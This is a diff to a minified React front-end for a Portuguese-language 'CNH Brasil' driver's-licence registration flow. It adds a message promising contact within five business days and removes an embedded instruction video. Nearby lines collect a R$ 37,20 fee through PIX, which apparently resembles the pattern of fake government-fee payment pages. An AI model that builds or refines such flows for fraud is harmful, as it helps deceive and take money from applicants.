@@ -15076,6 +15076,17 @@ function gp() {
             }), l.jsx("p", {
               className: "text-gray-600",
               children: "Seu cadastro foi concluído com sucesso!"
+            }), l.jsx("div", {
+              className: "mt-4 bg-green-50 border border-green-200 rounded-xl p-4 text-left",
+              children: l.jsxs("div", {
+                children: [l.jsx("p", {
+                  className: "font-bold text-green-800 mb-2",
+                  children: "✅ Cadastro realizado na CNH Brasil!"
+                }), l.jsx("p", {
+                  className: "text-green-700 text-sm",
+                  children: "Em até 5 dias úteis nossa equipe entrará em contato com você pelo número cadastrado para dar continuidade ao seu processo."
+                })]
+              })
             }), l.jsx("p", {
               className: "text-gray-500 text-sm mt-2",
               children: "Redirecionando..."
@@ -22770,15 +22781,6 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botão 
                   }
                 })]
               })
-            })
-          }), (o === "finalize_button" || o === "generating_pix" || o === "pix_document" || o === "awaiting_payment") && l.jsx("div", {
-            className: "mb-4 text-left",
-            children: l.jsxs("div", {
-              style: {maxWidth: "80%"},
-              children: [l.jsx("p", {
-                style: {fontWeight: "bold", color: "#cc0000", marginBottom: "6px", fontSize: "13px"},
-                children: "⚠️ IMPORTANTE: ASSISTA O VÍDEO"
-              }), l.jsx("iframe", {src: "https://streamable.com/e/np7h3v", frameBorder: "0", width: "100%", height: "250", allowFullScreen: true, allow: "autoplay; fullscreen", style: {display:"block",borderRadius:"16px"}})]
             })
           }), o === "finalize_button" && l.jsx("div", {
             className: "flex flex-col gap-3 max-w-[80%] mt-4",
